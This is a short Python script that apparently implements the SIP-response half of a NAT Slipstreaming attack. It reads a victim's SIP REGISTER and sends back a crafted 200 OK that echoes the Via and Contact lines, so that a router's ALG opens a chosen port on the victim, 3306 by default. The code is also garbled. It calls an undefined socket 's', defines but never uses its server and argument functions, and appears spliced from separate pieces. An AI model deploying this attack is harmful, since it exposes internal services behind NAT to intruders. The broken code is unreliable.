### Simple SIP Server - natty slipstream
### Just handles SIP part (no HTTP magic)
### Inspired by NAT Slipstream code (https://samy.pl/slipstream)

from socket import *
from re import search
from http.server import ThreadingHTTPServer
from handler import Handler
from argparse import ArgumentParser


def run(listen_port, pwn_port):
	Handler.port_num = pwn_port
	httpd = ThreadingHTTPServer(('', listen_port), Handler)
	httpd.serve_forever()


def port(num):
	if isinstance(num, int):
		return 1 <= num <= 65535
	return False


def get_args():
	parser = ArgumentParser(description='NAT Slipstreaming via Python')
	parser.add_argument('pwn-port', help='Port on the victim to connect to', type=port, default=3306)
	parser.add_argument('-l', '--listen-port', help='Port for the HTTP server to listen on.', default=8080, type=port)

	return parser.parse_args()


while True:
    con, client = s.accept()
    print("Connection from", client)
    done=0
    
    incoming_message = ""

    while done < 4: #simple way to detect EOM
        dataFromClient = con.recv(1)
        d = dataFromClient.decode()
        incoming_message += d
        print(d, end ="")
        
        if d == "\n" or d == "\r":
            done = done + 1 
        else:
            done=0    

    contact = ""
    via = ""
    for line in incoming_message.splitlines():
        if (line.startswith("Contact:")):
            contact = line

        if (line.startswith("Via:")):
            via = line

    print("Sending response")


    BODY=f"""SIP/2.0 200 OK
""" + via + """;received=0.0.0.0
From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519
To: <sip:wuzzi@example.org;transport=TCP>;tag=37GkEhwl6
Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.
CSeq: 1 REGISTER
""" + contact + """;expires=3600
Content-Length: 0


"""

    BODY = BODY.replace("\n","\r\n")
    print(BODY)
    con.send(BODY.encode("ascii"))
    con.close() 
    print("Response sent.")
